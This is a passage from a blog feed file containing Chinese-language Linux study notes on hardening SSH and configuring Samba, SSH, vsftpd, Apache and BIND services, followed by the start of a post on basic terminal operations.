</code></pre><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-13.png" alt="SSH 服务安全配置"></p><h3 id="使用客户端进行验证-6"><a href="#使用客户端进行验证-6" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。由于白名单与黑名单效果是一致的，这里只提供白名单的验证测试。注意：服务器上依然需要新建测试用户（包含设置密码，否则，不能登录）。</p></blockquote><p>这时候，我们就需要输入正确的密码。</p><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-14.png" alt="SSH 服务安全配置"></p><h2 id="限制-IP-登录"><a href="#限制-IP-登录" class="headerlink" title="限制 IP 登录"></a>限制 IP 登录</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在 <code>/etc/hosts.allow</code> 中添加 SSH 登录的 ip 或者网段， <code>For Example:</code></p><pre><code class="bash">sshd:192.168.1.2:allow        # ip 地址
sshd:192.168.1.0/24:allow     # 网段
</code></pre><p>在 <code>/etc/hosts.deny</code> 中添加不允许 SSH 登录的 IP， <code>For Example:</code></p><pre><code class="bash">sshd:ALL                      # ALL 表示除了上面允许的，其他的 ip 都拒绝登录
</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用 <code>iptables</code>， <code>For Example:</code></p><pre><code class="bash">iptables -A INPUT -p tcp -s 192.168.1.2 --destination-port 22 -j ACCEPT
iptables -A INPUT -p tcp --destination-port 22 -j DROP
</code></pre><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>修改 sshd 主配置文件 <code>/etc/ssh/sshd_config</code>， <code>For Example:</code></p><pre><code class="bash">AllowUsers test@192.168.1.2
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Protocol </tag>
            
            <tag> Service </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 服务配置笔记（一）：概述]]></title>
      <url>/2016/09/liunx-service/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>Liunx 的学习笔记已经推出有一段时间了，现继续推出在 Liunx 中 SAMBA 服务、SSH 服务、FTP 服务、APACHE 服务、DNS 服务的安全配置。本文就先介绍这几个服务的相关内容<a id="more"></a></p><h1 id="SAMBA-服务"><a href="#SAMBA-服务" class="headerlink" title="SAMBA 服务"></a>SAMBA 服务</h1><blockquote><p>即 Windows 下的共享，SAMBA 服务只不过是将 Liunx 下的文件共享给 Windows。</p></blockquote><h2 id="使用到的端口号"><a href="#使用到的端口号" class="headerlink" title="使用到的端口号"></a>使用到的端口号</h2><ul><li>NetBIOS 名字服务（默认为 <code>137</code> 端口(UDP)）</li><li>NetBIOS 数据报服务（默认为 <code>138</code> 端口(UDP)）</li><li>文件和打印共享（默认为 <code>139</code> 端口(TCP)）</li><li>NetBIOS 服务在 windos 2000 及以后版本使用此端口（默认为 <code>445</code> 端口(TCP)）</li></ul><h2 id="所需软件"><a href="#所需软件" class="headerlink" title="所需软件"></a>所需软件</h2><ul><li><p><strong>samba</strong></p><ul><li>这个软件主要包含了 SAMBA 的主要 daemon 文件（smbd 及 nmbd）、SAMBA 的文件（document）与 SAMBA 相关的 logrotate 设置文件及开机默认选项文件等。</li></ul></li><li><p><strong>samba-common</strong></p><ul><li>这个软件主要提供了 SAMBA 的主要配置文件（smb.conf）、smb.conf 语法检验的测试程序（testparm）等</li></ul></li><li><p><strong>samba-client</strong></p><ul><li>这个软件提供了当 Liunx 作为 SAMBA 客户端时，所需的工具指令，例如挂载 SAMBA 文件格式的执行文件 smbmount 等</li></ul></li></ul><h2 id="主配置文件"><a href="#主配置文件" class="headerlink" title="主配置文件"></a>主配置文件</h2><ul><li><p><strong>/etc/samba/smb.conf</strong></p><ul><li>是 SAMBA 的主要配置文件，基本上，SAMBA 就仅有这个配置文件而已，且这个配置文件本身就是很详细的说明文件，这个文件主要在设置工作组、NetBIOS 名称以及共享目录等。</li></ul></li></ul><h3 id="查看主配置文件的帮助"><a href="#查看主配置文件的帮助" class="headerlink" title="查看主配置文件的帮助"></a>查看主配置文件的帮助</h3><pre><code class="bash">man 5 smb.conf
</code></pre><h3 id="重要选项说明"><a href="#重要选项说明" class="headerlink" title="重要选项说明"></a>重要选项说明</h3><h4 id="全局选项"><a href="#全局选项" class="headerlink" title="全局选项"></a>全局选项</h4><ul><li><p><strong>workgroup = [MYGROUP]</strong></p><ul><li>定义 samba 服务器所在的工作组或者域（如果设置 <code>security = domain</code> 的话）。</li></ul></li><li><p><strong>server string = [Samba server]</strong></p><ul><li>设定 samba 服务器的描述，通过网络邻居访问时可在备注中查看到该描述信息。</li></ul></li><li><p><strong>netbios name = [MyServer]</strong></p><ul><li>主机 NetBIOS 名称，每台机子皆不同</li></ul></li><li><p><strong>security = share/user/server/domain/ads</strong></p><ul><li><strong>share</strong>: 访问 Samba 服务器共享资源时不需要输入用户名和密码，属于匿名访问。</li><li><strong>user</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码，认证用户来源为 Samba 服务器本机。</li><li><strong>server</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码，认证用户来源为另一台 Samba 服务器或 Windows 服务器。</li><li><strong>domain</strong>: Samba 服务器在一个基于 Windows NT 平台的 Windows 域中，访问共享资源需要输入用户名和密码，认证用户来源为 Windows 域。</li><li><strong>ads</strong>: Samba 服务器在一个基于 Windows 200X 平台的 Windows 活动目录中，访问共享资源需要输入用户名和密码，认证用户来源为 Windows 活动目录。</li></ul></li><li><p><strong>encrypt passwords = yes | no</strong></p><ul><li>设定是否对密码进行加密。如果不对密码进行加密的话，在认证会话期间，客户端与服务器传递的是明文密码。</li></ul></li><li><p><strong>passdb backend = tdbsam/smbpasswd/ldapsam/mysql</strong></p><ul><li><strong>tdbsam</strong>: 该方式使用一个数据库文件来建立用户数据库，数据库文件名为 passdb.tdb 。可以使用 <code>smbpasswd -a [userName]</code> 来建立 Samba 用户。也可以使用 <code>pdbedit</code> 命令来建立用户。</li><li><strong>smbpasswd</strong>: 该方式使用 Samba 提供的工具 smbpasswd 来给系统用户设置一个用于访问 Samba 服务的密码，客户端就用这个密码访问 Samba 共享资源。此方式还要使用一个 <code>smb passwd file = /usr/local/samba/etc/smbpasswd</code>（或 <code>/etc/samba/smbpasswd</code>） 参数来指定保存用户名和密码的文件，该文件需要手动建立。不推荐使用此方法。</li><li><strong>ldapsam</strong>: 该方式基于 LADP 的账户管理方式来验证用户，先要建立 LDAP服务。</li><li><strong>mysql</strong>: 该方式是将 Samba 服务器的用户名和密码存储到 MySQL 数据库中。</li></ul></li></ul><h4 id="局部设置"><a href="#局部设置" class="headerlink" title="局部设置"></a>局部设置</h4><ul><li><p><strong>comment = [comment]</strong></p><ul><li>设定共享服务的描述信息。</li></ul></li><li><p><strong>path = [path]</strong></p><ul><li>设定共享服务的路径。</li></ul></li><li><p><strong>read only = yes | no</strong></p><ul><li>设定该共享服务是否为只读，该选项有一个同义选项 <code>writeable</code>。</li></ul></li><li><p><strong>user = <a href="@[groupName]">userName</a></strong></p><ul><li>设定所有可能使用该共享服务的用户，可以使用 <code>@group</code> 来设置群组 group 中的所有用户账号。该选项的值为列表，不同的项目之间使用空格或逗号隔开。在设置 <code>security = share</code> 时，客户端要访问某共享服务时提供的密码会与该选项指定的所有用户进行一一配对认证，若某用户认证通过，则以该用户权限进行共享服务访问，否则拒绝客户端的访问（设置 <code>security = share</code>不是允许游客访问，只有 <code>guest ok = yes</code> 才是允许游客访问，切记！！！）。</li></ul></li><li><p><strong>valid users = <a href="@[groupName]">userName</a></strong></p><ul><li>设定能够使用该共享服务的用户和组，其值的格式与 user 选项一样。</li></ul></li><li><p><strong>invalid users = <a href="@[groupName]">userName</a></strong></p><ul><li>设定不能够使用该共享服务的用户和组，其值的格式与 user 选项一样。</li></ul></li><li><p><strong>invalid users = <a href="@[groupName]">userName</a></strong></p><ul><li>设定不能够使用该共享服务的用户和组，其值的格式与 user 选项一样。</li></ul></li><li><p><strong>read list = <a href="@[groupName]">userName</a></strong></p><ul><li>设定对该共享服务只有读取权限的用户和组，其值的格式与 user 选项一样。</li></ul></li><li><p><strong>write list = <a href="@[groupName]">userName</a></strong></p><ul><li>设定对该共享服务拥有读写权限的用户和组，其值的格式与 user 选项一样。</li></ul></li><li><p><strong>admin list = <a href="@[groupName]">userName</a></strong></p><ul><li>设定对该共享服务拥有管理权限的用户和组，其值的格式与user选项一样。</li></ul></li><li><p><strong>public = yes | no</strong></p><ul><li>设定该共享服务是否能够被游客访问，其同义选项有 guest ok。</li></ul></li><li><p><strong>create mode = mode</strong></p><ul><li>mode 为八进制值，如 0755，其默认值为 0744。该选项指定的值用于过滤新建文件的访问权限，新建文件的默认权限将与 create mode 指定的值进行按位与操作，将结果再与 force create mode 指定的值进行按位或操作，得到的结果即为新建文件的访问权限。</li></ul></li></ul><h2 id="服务的启动与停止"><a href="#服务的启动与停止" class="headerlink" title="服务的启动与停止"></a>服务的启动与停止</h2><blockquote><p>SAMBA 的服务名并不叫做 <code>samba</code>，而是 <code>smb</code>。</p></blockquote><pre><code class="bash">service smb status        # 状态
service smb start         # 启动
service smb stop          # 暂停
service smb restart       # 重启
</code></pre><h3 id="设置开机自启"><a href="#设置开机自启" class="headerlink" title="设置开机自启"></a>设置开机自启</h3><pre><code class="bash">chkconfig --list | grep smb   # 查看自启状态
chkconfig --level 35 smb on   # 设置开机自启
</code></pre><h1 id="SSH-服务"><a href="#SSH-服务" class="headerlink" title="SSH 服务"></a>SSH 服务</h1><blockquote><p>更安全的远程连接，它通过对联机数据包加密的技术来进行数据传输，因此，数据就更安全了。</p></blockquote><h2 id="使用到的端口号-1"><a href="#使用到的端口号-1" class="headerlink" title="使用到的端口号"></a>使用到的端口号</h2><ul><li>安全的数据传输（默认为 <strong><code>22</code></strong> 端口）</li></ul><h2 id="所需软件-1"><a href="#所需软件-1" class="headerlink" title="所需软件"></a>所需软件</h2><blockquote><p>一般情况下，RedHat 已经预装了 openssh，所以这里不做过多的阐述了</p></blockquote><h2 id="主配置文件-1"><a href="#主配置文件-1" class="headerlink" title="主配置文件"></a>主配置文件</h2><ul><li><p><strong>/etc/ssh/sshd_config</strong></p><ul><li><strong>sshd_config</strong> 是 SSH 的主要配置文件，基本上，SSH 相关的配置都放在这里，这个文件的默认配置项已经很完美了，事实上不需要过多的改动。</li></ul></li></ul><h3 id="查看主配置文件的帮助-1"><a href="#查看主配置文件的帮助-1" class="headerlink" title="查看主配置文件的帮助"></a>查看主配置文件的帮助</h3><pre><code class="bash">man 5 sshd_config
</code></pre><h3 id="重要选项说明-1"><a href="#重要选项说明-1" class="headerlink" title="重要选项说明"></a>重要选项说明</h3><h4 id="监听相关配置"><a href="#监听相关配置" class="headerlink" title="监听相关配置"></a>监听相关配置</h4><ul><li><p><strong>Port 22</strong></p><ul><li>设置连接到远程主机的端口，可以进行修改</li></ul></li><li><p><strong>ListenAddress [192.168.1.1]</strong></p><ul><li>设置 sshd 服务器绑定的 IP 地址</li></ul></li></ul><h4 id="密码、登录相关配置"><a href="#密码、登录相关配置" class="headerlink" title="密码、登录相关配置"></a>密码、登录相关配置</h4><ul><li><p><strong>MaxAuthTries 3</strong></p><ul><li>最大密码输入错误次数</li></ul></li><li><p><strong>PermitRootLogin no</strong></p><ul><li>设置 root 能不能用 ssh 登录。这个选项一定不要设成 <code>“yes”</code></li></ul></li><li><p><strong>LoginGraceTime 600</strong></p><ul><li>当用户连接上 SSH 时，在输入密码界面，设置在多长时间内没有成功连接 SSH ,就断线（若无单位默认以秒为单位）</li></ul></li><li><p><strong>PasswordAuthentication yes</strong></p><ul><li>设置是否允许口令验证</li></ul></li><li><p><strong>PermitEmptyPasswords no</strong></p><ul><li>设置是否允许用口令为空的帐号登录</li></ul></li></ul><h4 id="用户限制配置"><a href="#用户限制配置" class="headerlink" title="用户限制配置"></a>用户限制配置</h4><ul><li><p><strong>AllowUsers [userName]</strong></p><ul><li>设置白名单，可以跟着任意的数量的用户名的匹配串（patterns）或 user@host 这样的匹配串，这些字符串用空格隔开。</li></ul></li><li><p><strong>AllowGroups [groupName]</strong></p><ul><li>设置白名单，可以跟着任意的数量的组名的匹配串（patterns）或 user@host 这样的匹配串，这些字符串用空格隔开。</li></ul></li><li><p><strong>DenyUsers [userName]</strong></p><ul><li>设置黑名单，与 <code>AllowUsers</code> 写法一致。</li></ul></li><li><p><strong>DenyGroups [groupName]</strong></p><ul><li>设置黑名单，与 <code>AllowGroups</code> 写法一致。</li></ul></li></ul><h2 id="服务的启动与停止-1"><a href="#服务的启动与停止-1" class="headerlink" title="服务的启动与停止"></a>服务的启动与停止</h2><blockquote><p>SSh 的服务名并不叫做 <code>ssh</code>，而是 <code>sshd</code>。</p></blockquote><pre><code class="bash">service sshd status        # 状态
service sshd start         # 启动
service sshd stop          # 暂停
service sshd restart       # 重启
</code></pre><h3 id="设置开机自启-1"><a href="#设置开机自启-1" class="headerlink" title="设置开机自启"></a>设置开机自启</h3><pre><code class="bash">chkconfig --list | grep sshd   # 查看自启状态
chkconfig --level 35 sshd on   # 设置开机自启
</code></pre><h1 id="FTP-服务"><a href="#FTP-服务" class="headerlink" title="FTP 服务"></a>FTP 服务</h1><blockquote><p>确切的说，应该叫它 vsFTP。vsFTP 是一个基于 GPL 发布的类 Unix 系统上使用的 FTP 服务器软件，它的全称是 <code>Very Secure FTP</code></p></blockquote><h2 id="使用到的端口号-2"><a href="#使用到的端口号-2" class="headerlink" title="使用到的端口号"></a>使用到的端口号</h2><ul><li>命令通道的 FTP（默认为 <strong><code>21</code></strong> 端口）</li><li>数据传输的 FTP-data（默认为 <strong><code>20</code></strong> 端口）</li></ul><h2 id="所需软件-2"><a href="#所需软件-2" class="headerlink" title="所需软件"></a>所需软件</h2><ul><li><p><strong>vsftpd</strong></p><ul><li>这个软件主要包含了 vsFTP 的主要 daemon 文件。</li></ul></li></ul><h2 id="主要的配置文件"><a href="#主要的配置文件" class="headerlink" title="主要的配置文件"></a>主要的配置文件</h2><ul><li><p><strong>/etc/vsftp/vsftpd.conf</strong></p><ul><li>严格来说，整个 vsFTP 的配置文件就只有这一个。这个配置文件的设置是以 bash 的变量相同的设置方式来处理的，也就是 <code>“参数=设置值”</code> 来设置的，注意，等号两边不能有空格。</li></ul></li><li><p><strong>/etc/vsftpd/chroot_list</strong></p><ul><li>用来限制用户只能在家目录的文件，需要在主配置文件中进行配置，默认没有这个文件，需要手动创建，如果文件名不同，主配置文件也要对其相应的修改。</li></ul></li><li><p><strong>/etc/vsftpd/ftpusers</strong></p><ul><li>黑名单列表，就是用来规定哪些用户不能登录 FTP。</li></ul></li></ul><h3 id="查看主配置文件的帮助-2"><a href="#查看主配置文件的帮助-2" class="headerlink" title="查看主配置文件的帮助"></a>查看主配置文件的帮助</h3><pre><code class="bash">man 5 vsftpd.conf
</code></pre><h3 id="重要选项说明-2"><a href="#重要选项说明-2" class="headerlink" title="重要选项说明"></a>重要选项说明</h3><h4 id="全局设置"><a href="#全局设置" class="headerlink" title="全局设置"></a>全局设置</h4><ul><li><p><strong>write_enable=YES/NO</strong></p><ul><li>是否允许登陆用户有写权限。属于全局设置，默认值为 YES。</li></ul></li><li><p><strong>data_connection_timeout=120</strong></p><ul><li>设置建立 FTP 数据连接的超时时间，单位为秒。默认值为 120。</li></ul></li><li><p><strong>idle_session_timeout=300</strong></p><ul><li><p>设置多长时间不对 FTP 服务器进行任何操作，则断开该 FTP 连接，单位为秒。默认值为 300 。</p><h4 id="与本地用户相关的设置值"><a href="#与本地用户相关的设置值" class="headerlink" title="与本地用户相关的设置值"></a>与本地用户相关的设置值</h4></li></ul></li><li><p><strong>local_enable=YES/NO</strong></p><ul><li>控制是否允许本地用户登入，YES 为允许本地用户登入，NO为不允许。默认值为 YES。</li></ul></li><li><p><strong>local_umask=022</strong></p><ul><li>本地用户新增档案时的 umask 值。默认值为 <code>077</code>。</li></ul></li><li><p><strong>file_open_mode=0755</strong></p><ul><li>本地用户上传档案后的档案权限，与 chmod 所使用的数值相同。默认值为 <code>0666</code>。</li></ul></li><li><p><strong>userlist_enable=YES/NO</strong></p><ul><li>设置是否阻止 user_list 文件中的用户登录 FTP 服务器，默认为 YES</li></ul></li></ul><h4 id="与虚拟用户相关的设置值"><a href="#与虚拟用户相关的设置值" class="headerlink" title="与虚拟用户相关的设置值"></a>与虚拟用户相关的设置值</h4><ul><li><p><strong>guest_enable=YES/NO</strong></p><ul><li>启用虚拟用户。默认值为 NO。启用时，非匿名用户登录的帐号，会被当成访客，访客在 vsFTP 中默认会取得 FTP 这个用户的权限。</li></ul></li><li><p><strong>guest_username=FTP</strong></p><ul><li>在 <code>guest_enable=YES</code> 下才生效，指定游客的身份而已。默认为 FTP。</li></ul></li><li><p><strong>user_config_dir=</strong></p><ul><li>指定游客用户的配置文件存放的目录，无默认值，需自己定义。</li></ul></li></ul><h4 id="与匿名用户相关的设置值"><a href="#与匿名用户相关的设置值" class="headerlink" title="与匿名用户相关的设置值"></a>与匿名用户相关的设置值</h4><ul><li><p><strong>anonymous_enable=YES/NO</strong></p><ul><li>控制是否允许匿名用户登入，YES 为允许匿名登入，NO 为不允许。</li></ul></li><li><p><strong>anon_upload_enable=YES/NO</strong></p><ul><li>如果设为 YES，则允许匿名登入者有上传文件（非目录）的权限，只有在 <code>write_enable=YES</code> 时，此项才有效。当然，匿名用户必须要有对上层目录的写入权。默认值为 NO。</li></ul></li><li><p><strong>anon_world_readable_only=YES/NO</strong></p><ul><li>如果设为 YES，则允许匿名登入者下载可阅读的档案（可以下载到本机阅读，不能直接在 FTP 服务器中打开阅读）。默认值为 YES。</li></ul></li><li><p><strong>anon_mkdir_write_enable=YES/NO</strong></p><ul><li>如果设为 YES，则允许匿名登入者有新增目录的权限，只有在 <code>write_enable=YES</code> 时，此项才有效。当然，匿名用户必须要有对上层目录的写入权。默认值为 NO。</li></ul></li><li><p><strong>anon_other_write_enable=YES/NO</strong></p><ul><li>如果设为 YES，则允许匿名登入者更多于上传或者建立目录之外的权限，譬如删除或者重命名。（如果 <code>anon_upload_enable=NO</code>，则匿名用户不能上传文件，但可以删除或者重命名已经存在的文件；如果 <code>anon_mkdir_write_enable=NO</code>，则匿名用户不能上传或者新建文件夹，但可以删除或者重命名已经存在的文件夹。）默认值为 NO。</li></ul></li></ul><h4 id="与用户限制相关的设置值"><a href="#与用户限制相关的设置值" class="headerlink" title="与用户限制相关的设置值"></a>与用户限制相关的设置值</h4><ul><li><p><strong>chroot_list_enable=YES/NO</strong></p><ul><li>设置是否启用 <code>chroot_list_file</code> 配置项指定的用户列表文件。默认值为 NO。</li></ul></li><li><p><strong>chroot_list_file=/etc/vsftpd.chroot_list</strong></p><ul><li>用于指定用户列表文件，该文件用于控制哪些用户可以切换到用户家目录的上级目录。</li></ul></li><li><p><strong>chroot_local_user=YES/NO</strong></p><ul><li>用于指定用户列表文件中的用户是否允许切换到上级目录。默认值为 NO。</li></ul></li></ul><h2 id="服务的启动与停止-2"><a href="#服务的启动与停止-2" class="headerlink" title="服务的启动与停止"></a>服务的启动与停止</h2><blockquote><p>FTP 的服务名并不叫做 <code>vsftp</code>，而是 <code>vsftpd</code>。</p></blockquote><pre><code class="bash">service vsftpd status        # 状态
service vsftpd start         # 启动
service vsftpd stop          # 暂停
service vsftpd restart       # 重启
</code></pre><h3 id="设置开机自启-2"><a href="#设置开机自启-2" class="headerlink" title="设置开机自启"></a>设置开机自启</h3><pre><code class="bash">chkconfig --list | grep vsftpd   # 查看自启状态
chkconfig --level 35 vsftpd on   # 设置开机自启
</code></pre><h1 id="APACHE-服务"><a href="#APACHE-服务" class="headerlink" title="APACHE 服务"></a>APACHE 服务</h1><blockquote><p>APACHE 是一款 WEB 服务器软件，它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的 WEB 服务器端软件之一。</p></blockquote><h2 id="使用到的端口号-3"><a href="#使用到的端口号-3" class="headerlink" title="使用到的端口号"></a>使用到的端口号</h2><ul><li>超文本传输协议（默认为 <code>80</code> 端口）</li><li>更安全的超文本传输协议（默认为 <code>443</code> 端口）</li></ul><h2 id="所需软件-3"><a href="#所需软件-3" class="headerlink" title="所需软件"></a>所需软件</h2><blockquote><p>APACHE 服务需要较多的软件进行支持，RedHat 已经预装了此软件，这里就不一一阐述了。</p></blockquote><h2 id="主要的配置文件-1"><a href="#主要的配置文件-1" class="headerlink" title="主要的配置文件"></a>主要的配置文件</h2><ul><li><p><strong>/etc/httpd/conf/httpd.conf</strong></p><ul><li>最主要的配置文件，里买内包含了 APACHE 服务器主配置文件. 包括服务器指令的目录设置。</li></ul></li></ul><h3 id="查看配置文件爱呢的帮助"><a href="#查看配置文件爱呢的帮助" class="headerlink" title="查看配置文件爱呢的帮助"></a>查看配置文件爱呢的帮助</h3><pre><code class="bash">man 5 httpd.conf
</code></pre><h2 id="重要选项说明-3"><a href="#重要选项说明-3" class="headerlink" title="重要选项说明"></a>重要选项说明</h2><ul><li><p><strong>Listen 80</strong></p><ul><li>设置监听的端口号</li></ul></li><li><p><strong>DocumentRoot “/var/www/html”</strong></p><ul><li>定义网站的根目录，默认的目录在 <code>/var/www/html</code>，修改此选项时，要同时修改下面一个选项。</li></ul></li><li><p>&lt;<strong>Directory “/var/www/html”</strong>&gt;</p><ul><li>定义网站的一个目录，修改此选项时，要同时修改上面一个选项。</li></ul></li><li><p><strong>Alias /icons/ “/var/www/icons”</strong></p><ul><li>目录的别名设置，就是浏览器访问 <code>//[host]/icons</code> 时，实际上访问的是 <code>/var/www/icons</code> 目录，配置此选项时，要同时配置下面的目录权限。</li></ul></li><li><p>&lt;<strong>Directory “/var/www/icons”</strong>&gt;</p></li><li><p><strong>Options Index FollowSymLinks</strong></p><ul><li><code>Index</code> 设置是否开启目录浏览，默认启用，禁止在前面加一个 <code>-</code></li><li><code>FollowSymLinks</code> 设置是否禁用符号连接追踪，默认启用，禁止在前面加一个 <code>-</code></li></ul></li><li><p><strong>Allow from all</strong></p><ul><li>配置白名单，默认允许所有的 IP 段访问。</li></ul></li><li><p><strong>ServerSignature On</strong></p><ul><li>配置是否隐藏 APACHE 的版本信息，默认是开启，还可以设置为 <code>Off</code> 和 <code>EMail</code>。其中 <code>Off</code> 是隐藏信息，<code>EMail</code> 是会显示管理员的 email 信息的。</li></ul></li><li><p><strong>NameVirtualHost *:443</strong></p><ul><li>设置开放的端口，一般在配置 <code>https</code> 时候修改它，修改这个选项，要同时修改下面一个选项。</li></ul></li><li><p>&lt;<strong>VirtualHost *:443</strong>&gt;</p><ul><li>设置开放的端口。</li></ul></li></ul><h2 id="服务的启动与停止-3"><a href="#服务的启动与停止-3" class="headerlink" title="服务的启动与停止"></a>服务的启动与停止</h2><blockquote><p>APACHE 的服务名并不叫做 <code>http</code>，而是 <code>httpd</code>。</p></blockquote><pre><code class="bash">service httpd status        # 状态
service httpd start         # 启动
service httpd stop          # 暂停
service httpd restart       # 重启
</code></pre><h3 id="设置开机自启-3"><a href="#设置开机自启-3" class="headerlink" title="设置开机自启"></a>设置开机自启</h3><pre><code class="bash">chkconfig --list | grep httpd   # 查看自启状态
chkconfig --level 35 httpd on   # 设置开机自启
</code></pre><h1 id="DNS-服务"><a href="#DNS-服务" class="headerlink" title="DNS 服务"></a>DNS 服务</h1><blockquote><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的 IP 地址 (IP address) 转换的服务器。</p></blockquote><h2 id="使用到的端口号-4"><a href="#使用到的端口号-4" class="headerlink" title="使用到的端口号"></a>使用到的端口号</h2><ul><li>UDP解析（默认为 <code>53</code> 端口）</li></ul><h2 id="所需软件-4"><a href="#所需软件-4" class="headerlink" title="所需软件"></a>所需软件</h2><ul><li><p><strong>bind</strong></p><ul><li>DNS 主要的包，包含 named 守护进程（用来回答查询结果的），还有一些重要命令：<code>nslookup</code>，<code>dig</code> 和 <code>host</code>，等等。</li></ul></li><li><p><strong>caching-nameserver</strong></p><ul><li>包含 DNS 的主配置文件模板，区域配置文件模板等。</li></ul></li></ul><h2 id="主配置文件-2"><a href="#主配置文件-2" class="headerlink" title="主配置文件"></a>主配置文件</h2><ul><li><p><strong>/etc/named-caching-nameserver.conf</strong></p><ul><li>DNS 主配置文件，实际中需要把此文件复制成 <code>named.conf</code>，方能使用</li></ul></li><li><p><strong>/etc/named-rfc1912.zones</strong></p><ul><li>DNS 区域配置文件，实际中需要把此文件复制成 <code>named.zones</code>，方能使用</li></ul></li><li><p><strong>/var/named/named.zero</strong></p><ul><li>DNS 正向解析文件，实际中需要把此文件复制成 <code>named.zones</code> 中配置的文件名</li></ul></li><li><p><strong>/var/named/named.local</strong></p><ul><li>DNS 反向解析文件，实际中需要把此文件复制成 <code>named.zones</code> 中配置的文件名</li></ul></li></ul><h2 id="查看主配置文件的帮助-3"><a href="#查看主配置文件的帮助-3" class="headerlink" title="查看主配置文件的帮助"></a>查看主配置文件的帮助</h2><pre><code class="bash">man 5 named-caching-nameserver.conf
</code></pre><h2 id="重要选项说明-4"><a href="#重要选项说明-4" class="headerlink" title="重要选项说明"></a>重要选项说明</h2><ul><li><p><strong>allow-query { any; };</strong></p><ul><li>表示所有人能查询这台服务器，可以修改成 IP 地址或网段，限制其查询</li></ul></li><li><p><strong>allow-recursion { any; };</strong></p><ul><li>只针对收到的递归查询请求，对于非递归请求不关心，可以修改成 IP 地址或网段，限制其递归查询</li></ul></li><li><p><strong>allow-transfer { any; };</strong></p><ul><li>限制哪些主机或者网络可以传递信息至区域文件</li></ul></li></ul><h2 id="服务的启动与停止-4"><a href="#服务的启动与停止-4" class="headerlink" title="服务的启动与停止"></a>服务的启动与停止</h2><blockquote><p>DNS 的服务名并不叫做 <code>name</code>，而是 <code>named</code>。</p></blockquote><pre><code class="bash">service named status        # 状态
service named start         # 启动
service named stop          # 暂停
service named restart       # 重启
</code></pre><h3 id="设置开机自启-4"><a href="#设置开机自启-4" class="headerlink" title="设置开机自启"></a>设置开机自启</h3><pre><code class="bash">chkconfig --list | grep named   # 查看自启状态
chkconfig --level 35 named on   # 设置开机自启
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Service </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 学习笔记（五）：基础操作]]></title>
      <url>/2016/09/liunx-basic-operation/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本篇是 Liunx 的学习笔记系列第五篇，这一篇将介绍 Liunx 的基础操作。很多人觉得 Liunx 非常难学，但不其然，只要掌握一些基础的命令操作，Liunx 还是非常好上手的<a id="more"></a></p><h1 id="Liunx-终端"><a href="#Liunx-终端" class="headerlink" title="Liunx 终端"></a>Liunx 终端</h1><h2 id="终端和控制台的区别"><a href="#终端和控制台的区别" class="headerlink" title="终端和控制台的区别"></a>终端和控制台的区别</h2><blockquote><p>终端 (Terminal) 和控制台 (Console) 是有区别的</p></blockquote><p>终端本质上是对应着 Liunx 上的 <code>/dev/tty</code> 设备，Liunx 的多用户登陆就是通过不同的 <code>/dev/tty</code> 设备完成的，Liunx 默认提供了 6 个纯命令行界面的 <code>&quot;terminal&quot;</code> （准确的说这里应该是 6 个 <code>virtual consoles</code>）来让用户登录，你可以通过使用 <code>[Ctrl]+[Alt]+[F1]～[F6]</code> 进行切换，不过在在线实验环境中可能无法切换，因为特殊功能按键会被你主机系统劫持。当你切换到其中一个终端后想要切换回图形界面，你可以按下 <code>[Ctrl]+[Alt]+[F7]</code> 来完成</p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>Shell 是指”提供给使用者使用界面”的软件（命令解析器）,类似于 DOS 下的 command (命令行)和后来的 cmd.exe。之所以被称作 shell 是因为它隐藏了操作系统底层的细节。就像是个 Shell (壳)，有壳就有核，这里的核就是指的 UNIX/Liunx 内核。</p><h2 id="重要的快捷键（只列出常用的）"><a href="#重要的快捷键（只列出常用的）" class="headerlink" title="重要的快捷键（只列出常用的）"></a>重要的快捷键（只列出常用的）</h2><table><thead><tr><th>按键</th><th>作用</th></tr></thead><tbody><tr><td><strong>Tab</strong></td><td>进行命令补全</td></tr><tr><td><strong>Ctrl+c</strong></td><td>强行终止当前程序（最常用，你可以放心它并不会使终端退出)</td></tr><tr><td><strong>Ctrl+d</strong></td><td>这个才是强制退出终端的(不用敲 exit 了)</td></tr><tr><td><strong>Ctrl+s</strong></td><td>暂定当前程序，暂停后按下任意键恢复运行(网络交互有用)</td></tr><tr><td><strong>Ctrl+z</strong></td><td>将当前程序放到后台运行，恢复到前台为命令 fg</td></tr><tr><td><strong>Ctrl+u</strong></td><td>删除光标所在的整行</td></tr><tr><td><strong>Ctrl+l</strong></td><td>清屏，最常用</td></tr><tr><td><strong>Ctrl+k</strong></td><td>删除从光标所在位置到行末</td></tr><tr><td><strong>Alt+Backspace</strong></td><td>向前删除一个单词</td></tr><tr><td><strong>Shift+PgUp</strong></td><td>将终端显示向上滚动</td></tr><tr><td><strong>Shift+PgDn</strong></td><td>将终端显示向下滚动</td></tr></tbody></table><h2 id="使用通配符"><a href="#使用通配符" class="headerlink" title="使用通配符"></a>使用通配符</h2><p><code>举例:</code></p><pre><code class="bash">touch love_{1..10}_Liunx.txt
